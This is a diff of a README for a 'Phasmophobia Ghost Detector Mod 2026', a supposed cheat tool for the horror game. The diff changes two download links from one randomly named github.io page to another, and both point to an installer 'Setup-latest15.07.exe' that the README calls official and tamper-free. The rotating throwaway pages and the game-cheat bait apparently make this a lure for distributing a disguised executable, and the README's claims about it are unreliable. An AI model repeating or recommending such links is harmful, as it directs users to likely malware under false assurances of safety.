@@ -2,7 +2,7 @@
 
 The Phasmophobia Ghost Detector Mod 2026 is an advanced tool designed to assist players in the popular horror game Phasmophobia. This mod provides real-time ghost detection and customizable features to improve your gameplay on Windows 10 and 11. With an intuitive interface, it integrates seamlessly with the game to offer enhanced analysis and alerts, making it an essential companion for serious ghost hunters.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## System Requirements
 
@@ -74,7 +74,7 @@ The mod checks for updates automatically when launched. If an update is availabl
 
 Get the latest version of Phasmophobia Ghost Detector Mod 2026 from the official download page. This ensures you have the most recent features and security improvements.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 This link provides access to the official installer, including the **Setup-latest15.07.exe** file. We recommend downloading only from this source to avoid tampered versions.
 
